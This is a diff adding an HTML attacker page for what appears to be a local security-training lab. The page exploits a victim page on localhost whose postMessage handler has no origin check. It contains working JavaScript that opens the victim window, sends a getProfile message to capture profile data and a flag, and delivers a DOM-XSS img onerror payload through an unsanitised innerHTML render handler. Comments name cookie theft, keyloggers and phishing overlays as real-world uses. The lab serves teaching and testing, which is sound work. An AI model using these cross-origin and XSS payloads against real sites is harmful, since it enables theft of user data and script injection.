@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X3 — postMessage Missing Origin Check Exploit</title>
+  <style>
+    body { background: #0d1117; color: #e6edf3; font-family: 'Courier New', monospace; padding: 24px; margin: 0; }
+    h1 { color: #3fb950; font-size: 1.2rem; margin-bottom: 16px; }
+    h2 { color: #58a6ff; font-size: 1rem; margin: 16px 0 8px; }
+    .terminal { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 12px 0; white-space: pre-wrap; font-size: 0.85rem; min-height: 60px; }
+    .status { color: #d29922; }
+    .success { color: #3fb950; }
+    .error { color: #f85149; }
+    button { background: #238636; color: #e6edf3; border: 1px solid #3fb950; border-radius: 4px; padding: 8px 16px; cursor: pointer; font-family: inherit; margin: 4px 2px; }
+    button:hover { background: #2ea043; }
+    input[type=text] { background: #161b22; color: #e6edf3; border: 1px solid #30363d; border-radius: 4px; padding: 8px; font-family: inherit; width: 100%; margin: 4px 0 8px; }
+    label { color: #7d8590; font-size: 0.85rem; }
+    a { color: #58a6ff; }
+    .badge { display: inline-block; font-size: 0.75rem; padding: 2px 8px; border-radius: 12px; margin-right: 6px; }
+    .attacker-badge { background: rgba(248,81,73,0.15); border: 1px solid #f85149; color: #f85149; }
+    .victim-badge { background: rgba(88,166,255,0.15); border: 1px solid #58a6ff; color: #58a6ff; }
+
+    .origin-bar {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+      font-size: 0.82rem;
+      display: flex;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
+    .code-block {
+      background: #161b22;
+      border: 1px solid #388bfd44;
+      border-left: 3px solid #58a6ff;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin: 10px 0;
+      white-space: pre;
+      font-size: 0.82rem;
+      overflow-x: auto;
+    }
+    .flag-box {
+      background: rgba(63,185,80,0.08);
+      border: 1px solid #3fb950;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin: 12px 0;
+      font-size: 1rem;
+    }
+    .warn-box {
+      background: rgba(210,153,34,0.08);
+      border: 1px solid #d29922;
+      border-radius: 6px;
+      padding: 12px 16px;
+      margin: 12px 0;
+      font-size: 0.83rem;
+      color: #d29922;
+    }
+    .nav { margin-bottom: 20px; font-size: 0.82rem; }
+    .divider { border: none; border-top: 1px solid #21262d; margin: 20px 0; }
+    .button-row { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 8px; }
+    .btn-secondary { background: #21262d; border-color: #d29922; color: #d29922; }
+    .btn-secondary:hover { background: #30363d; }
+  </style>
+</head>
+<body>
+
+  <div class="nav"><a href="index.html">← Exploit Console</a></div>
+
+  <h1>[X3] postMessage Missing Origin Check Exploit</h1>
+
+  <div class="origin-bar">
+    <span><span class="badge attacker-badge">ATTACKER</span> http://localhost:3001 <em style="color:#6e7681">(this page)</em></span>
+    <span><span class="badge victim-badge">TARGET</span> http://localhost:3000/x3.html → postMessage handler</span>
+  </div>
+
+  <p style="color:#7d8590; font-size:0.85rem; margin: 0 0 8px;">
+    The victim page at <code>/x3.html</code> listens for <code>postMessage</code> events but does not verify
+    <code>event.origin</code> before responding. This allows any window — including this attacker page —
+    to send crafted messages and receive the victim's sensitive data in reply.
+  </p>
+
+  <div class="warn-box">
+    <strong>Popup blocker warning:</strong> This exploit uses <code>window.open()</code>.
+    Your browser may block the popup. If prompted, allow popups for <strong>localhost:3001</strong>,
+    then click the button again.
+  </div>
+
+  <div class="button-row">
+    <button onclick="launchExploit()">Launch postMessage Exploit</button>
+    <button class="btn-secondary" onclick="testDomXss()">Test DOM-XSS Bridge</button>
+    <button onclick="clearOutput()" style="background:#21262d; border-color:#30363d;">Clear</button>
+  </div>
+
+  <h2>Exploit Log</h2>
+  <div class="terminal" id="log"><span class="status">Waiting for exploit launch...</span></div>
+
+  <h2>Message Received from Victim</h2>
+  <div class="terminal" id="response"><span class="status">No message yet.</span></div>
+
+  <div id="flag-container" style="display:none;">
+    <h2>Captured Data</h2>
+    <div class="flag-box success" id="flag-display"></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <h2>Exploit Code — getProfile (Data Exfiltration)</h2>
+  <div class="code-block">// Open the victim page in a new window.
+// We keep a reference to the window object so we can postMessage into it.
+const win = window.open('http://localhost:3000/x3.html');
+
+// Listen for the reply BEFORE sending our message.
+// The victim handler fires window.opener.postMessage(data, '*') — no origin check.
+window.addEventListener('message', (e) => {
+  // e.origin tells us it came from localhost:3000, but the victim never checked OUR origin.
+  // The victim replied to our malicious message without verifying we were a trusted sender.
+  output.textContent = 'Received from victim: ' + e.data;
+});
+
+// Wait for the victim page to load before sending our exploit message.
+setTimeout(() => {
+  // Send a message the victim's handler will respond to.
+  // The victim uses JSON.parse(event.data).type to decide what to do.
+  win.postMessage(JSON.stringify({ type: 'getProfile' }), '*');
+  // '*' means we don't restrict which origin receives this — we want the victim window.
+}, 1500);</div>
+
+  <h2>Exploit Code — DOM-XSS Bridge (Secondary Impact)</h2>
+  <div class="code-block">// The victim's handler also accepts { type: 'render', html: '...' }
+// and writes it to innerHTML without sanitisation.
+// This means we can inject arbitrary HTML/JS into the victim page from a different origin.
+
+win.postMessage(JSON.stringify({
+  type: 'render',
+  html: '&lt;img src=x onerror="document.title=\'XSS from attacker!\'"&gt;'
+}), '*');
+
+// In a real attack this payload could be:
+//   - document.cookie exfiltration
+//   - Keylogger injection
+//   - Credential phishing overlay
+//   - Persistent DOM manipulation</div>
+
+  <script>
+    let victimWindow = null;
+
+    // Global message listener — receives replies from the victim window
+    window.addEventListener('message', function(e) {
+      // We receive messages from the victim (localhost:3000) here.
+      // Note: we should verify e.origin in a real application, but as the attacker we just accept everything.
+      if (!e.data) return;
+
+      const logEl     = document.getElementById('log');
+      const responseEl= document.getElementById('response');
+
+      const line = document.createElement('span');
+      line.className = 'success';
+      line.textContent = '[+] postMessage received! origin=' + e.origin + '\n';
+      logEl.appendChild(line);
+
+      responseEl.textContent = '';
+
+      let parsed;
+      try {
+        parsed = JSON.parse(e.data);
+        responseEl.textContent = JSON.stringify(parsed, null, 2);
+      } catch(_) {
+        responseEl.textContent = String(e.data);
+        parsed = {};
+      }
+
+      // Hunt for flag / sensitive data
+      const raw = JSON.stringify(parsed);
+      const flagMatch = raw.match(/flag\{[^}]+\}/i);
+      if (parsed.flag || flagMatch || parsed.username || parsed.email) {
+        document.getElementById('flag-container').style.display = 'block';
+        const display = document.getElementById('flag-display');
+        if (parsed.flag || flagMatch) {
+          const flagValue = parsed.flag || (flagMatch && flagMatch[0]);
+          display.textContent = 'FLAG CAPTURED: ' + flagValue;
+          const fl = document.createElement('span');
+          fl.className = 'success';
+          fl.textContent = '[!!!] FLAG CAPTURED: ' + flagValue + '\n';
+          logEl.appendChild(fl);
+        } else {
+          display.textContent = 'DATA CAPTURED: ' + JSON.stringify(parsed);
+        }
+      }
+    });
+
+    function logMsg(msg, cls) {
+      const logEl = document.getElementById('log');
+      if (logEl.querySelector('.status')) logEl.innerHTML = '';
+      const s = document.createElement('span');
+      s.className = cls || '';
+      s.textContent = msg + '\n';
+      logEl.appendChild(s);
+    }
+
+    function launchExploit() {
+      logMsg('[*] Opening victim page: http://localhost:3000/x3.html', 'status');
+
+      victimWindow = window.open('http://localhost:3000/x3.html');
+
+      if (!victimWindow) {
+        logMsg('[-] window.open() was blocked by the popup blocker!', 'error');
+        logMsg('    Allow popups for localhost:3001, then try again.', 'status');
+        document.getElementById('response').innerHTML = '<span class="error">Popup blocked. Allow popups and retry.</span>';
+        return;
+      }
+
+      logMsg('[*] Victim window opened. Waiting 1500ms for page to load...', 'status');
+      logMsg('[*] Registered window.addEventListener("message", ...) to catch the reply.', 'status');
+
+      setTimeout(() => {
+        if (!victimWindow || victimWindow.closed) {
+          logMsg('[-] Victim window was closed before we could send the message.', 'error');
+          return;
+        }
+        const payload = JSON.stringify({ type: 'getProfile' });
+        logMsg('[*] Sending postMessage to victim: ' + payload, 'status');
+        logMsg('    Target specifier: "*" (any origin)', 'status');
+
+        // Send the exploit message to the victim window
+        // The victim's handler responds to { type: 'getProfile' } with the user's profile + flag
+        victimWindow.postMessage(payload, '*');
+
+        logMsg('[+] Message sent. Waiting for victim response...', 'success');
+      }, 1500);
+    }
+
+    function testDomXss() {
+      if (!victimWindow || victimWindow.closed) {
+        logMsg('[-] No victim window open. Run "Launch postMessage Exploit" first.', 'error');
+        return;
+      }
+      logMsg('[*] Sending DOM-XSS payload to victim window...', 'status');
+
+      // Send a render message with an XSS payload
+      // The victim writes event.data.html to innerHTML — our payload executes
+      const xssPayload = JSON.stringify({
+        type: 'render',
+        html: '<img src=x onerror="document.title=\'XSS from attacker:\'+location.origin">'
+      });
+      victimWindow.postMessage(xssPayload, '*');
+
+      logMsg('[+] DOM-XSS payload sent. Check the victim tab — its title should change.', 'success');
+      logMsg('    Payload: <img src=x onerror="document.title=\'XSS from attacker:\'+ location.origin">', 'status');
+      logMsg('    In a real attack this would be: cookie theft, keylogger, overlay phishing.', 'status');
+    }
+
+    function clearOutput() {
+      document.getElementById('log').innerHTML = '<span class="status">Waiting for exploit launch...</span>';
+      document.getElementById('response').innerHTML = '<span class="status">No message yet.</span>';
+      document.getElementById('flag-container').style.display = 'none';
+    }
+  </script>
+
+</body>
+</html>
